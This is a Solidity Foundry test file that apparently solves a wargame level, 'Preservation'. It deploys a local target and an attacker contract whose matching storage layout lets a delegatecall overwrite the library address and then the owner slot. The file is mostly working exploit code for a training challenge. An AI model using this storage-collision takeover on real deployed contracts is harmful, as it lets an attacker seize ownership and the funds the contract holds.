// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

import "../instance/Level16.sol";
import "forge-std/Test.sol";

contract ExploitLevel16 is Test {
    LibraryContract timeZone1Library = new LibraryContract();
    LibraryContract timeZone2Library = new LibraryContract();
    Preservation instance = new Preservation(address(timeZone1Library), address(timeZone2Library));

    function testExploit() external {
        AttackPreservation attackP = new AttackPreservation();
        uint256 addressThis = uint256(uint160(address(attackP)));

        instance.setFirstTime(addressThis);
        instance.setFirstTime(0);

        console.log(instance.owner());
    }
}

contract AttackPreservation {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256) public {
        owner = 0x9606e11178a83C364108e99fFFD2f7F75C99d801;
    }
}
